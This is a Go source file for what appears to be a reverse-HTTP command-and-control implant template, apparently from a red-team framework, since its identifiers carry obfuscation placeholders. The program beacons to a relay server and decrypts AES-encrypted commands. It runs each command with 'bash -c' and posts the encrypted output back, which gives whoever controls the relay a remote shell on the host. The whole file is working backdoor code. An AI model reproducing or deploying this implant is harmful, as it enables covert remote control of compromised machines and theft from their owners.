package main

import(
	"io/ioutil"
	"strings"
	"strconv"
	"time"
	"math/rand"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"os/exec"
	"net/http"
)

const(
	obf_const_session_id = "sess"
	obf_const_post_tag = "ip"
	obf_const_get_tag = "ig"
)

var(
	obf_var_encryption_key = []byte("00000000000000000000000000000000")
	obf_var_relay_address = ""
	obf_var_user_agent = "Sewers Interpreter (Linux) Reverse HTTP Test Session"
)

func obf_func_encrypt(obf_var_payload []byte) []byte {
	obf_var_block, _ := aes.NewCipher(obf_var_encryption_key)
	obf_var_b := base64.StdEncoding.EncodeToString(obf_var_payload)
	obf_var_ciphertext := make( []byte, aes.BlockSize+len(obf_var_b) )
	obf_var_iv := obf_var_ciphertext[:aes.BlockSize]
	obf_var_cfb := cipher.NewCFBEncrypter(obf_var_block, obf_var_iv)
	obf_var_cfb.XORKeyStream( obf_var_ciphertext[aes.BlockSize:], []byte(obf_var_b) )
	obf_var_enc_ciphertext := []byte( base64.StdEncoding.EncodeToString(obf_var_ciphertext) )
	return obf_var_enc_ciphertext
}

func obf_func_decrypt(obf_var_payload []byte) []byte {
	obf_var_block, _ := aes.NewCipher(obf_var_encryption_key)
	obf_var_payload, _ = base64.StdEncoding.DecodeString( string(obf_var_payload) )
	obf_var_iv := obf_var_payload[:aes.BlockSize]
	obf_var_payload = obf_var_payload[aes.BlockSize:]
	obf_var_cfb := cipher.NewCFBDecrypter(obf_var_block, obf_var_iv)
	obf_var_cfb.XORKeyStream(obf_var_payload, obf_var_payload)
	obf_var_data := []byte{}
	obf_var_data, _ = base64.StdEncoding.DecodeString( string(obf_var_payload) )
	return obf_var_data
}

func obf_func_exec(obf_var_interpreter_command string) []byte {
	obf_var_stdout, obf_var_e := exec.Command("bash", "-c", obf_var_interpreter_command).Output()
	if obf_var_e != nil {
		return []byte( obf_var_e.Error() )
	}
	return obf_var_stdout
}

func obf_func_send_request(obf_var_request_type, obf_const_session_id, obf_var_request_body string) string {
	var obf_var_return string
	if obf_var_request_type == obf_const_post_tag {
		obf_var_a := []string{obf_var_request_type, obf_const_session_id, obf_var_request_body}
		obf_var_packet := strings.Join(obf_var_a, "\n")
		obf_var_packet_buffer := strings.NewReader(obf_var_packet)
		obf_var_req, _ := http.NewRequest( "POST", obf_var_relay_address, obf_var_packet_buffer )
		obf_var_req.Header.Set("User-Agent", obf_var_user_agent)
		obf_var_client := &http.Client{}
		obf_var_res, _ := obf_var_client.Do(obf_var_req)
		defer obf_var_res.Body.Close()
		obf_var_body, obf_var_e := ioutil.ReadAll(obf_var_res.Body)
		if obf_var_e == nil {
			obf_var_return = string(obf_var_body)
		}
	} else if obf_var_request_type == obf_const_get_tag {
		obf_var_a := []string{obf_var_request_type, obf_const_session_id, obf_var_request_body}
		obf_var_packet := strings.Join(obf_var_a, "\n")
		obf_var_req, _ := http.NewRequest( "POST", obf_var_relay_address, strings.NewReader(obf_var_packet) )
		obf_var_req.Header.Set("User-Agent", obf_var_user_agent)
		obf_var_client := &http.Client{}
		obf_var_res, obf_var_e := obf_var_client.Do(obf_var_req)
		if obf_var_e == nil {
			defer obf_var_res.Body.Close()
			obf_var_body, _ := ioutil.ReadAll(obf_var_res.Body)
			obf_var_return = string(obf_var_body)
		}
	}
	return obf_var_return
}

func main() {
	rand.Seed( time.Now().UnixNano() )
	obf_var_rate := 1 + rand.Intn(2-1)
	for {
		obf_var_res := obf_func_send_request(obf_const_get_tag, obf_const_session_id, "nil")
		if obf_var_res != "" {
			obf_var_response := []byte("")
			obf_var_packet_list := strings.Split(obf_var_res, ",")
			for i := 0; i < len(obf_var_packet_list); i++ {
				obf_var_res = obf_func_send_request(obf_const_get_tag, obf_const_session_id, obf_var_packet_list[i])
				if obf_var_res != "" {
					obf_var_enc_res := []byte(obf_var_res)
					obf_var_dec_res := obf_func_decrypt(obf_var_enc_res)
					obf_var_payload := string(obf_var_dec_res)
					if strings.Split(obf_var_payload, " ")[0] == "obf_tag_fetch_rate" {
						obf_var_a := strings.Split(obf_var_payload, " ")[1]
						obf_var_b := strings.Split(obf_var_payload, " ")[2]
						obf_var_a_int, _ := strconv.Atoi(obf_var_a)
						obf_var_b_int, _ := strconv.Atoi(obf_var_b)
						obf_var_rate = obf_var_a_int + rand.Intn(obf_var_b_int-obf_var_a_int)
						obf_var_response = []byte("\x00")
					} else {
						obf_var_response = obf_func_exec(obf_var_payload)
					}
				}
				obf_var_enc_response := obf_func_encrypt(obf_var_response)
				obf_func_send_request( obf_const_post_tag, obf_const_session_id, string(obf_var_enc_response) )
				time.Sleep( 2 * time.Second )
			}
		}
		time.Sleep( time.Duration(obf_var_rate) * time.Second )
	}
}
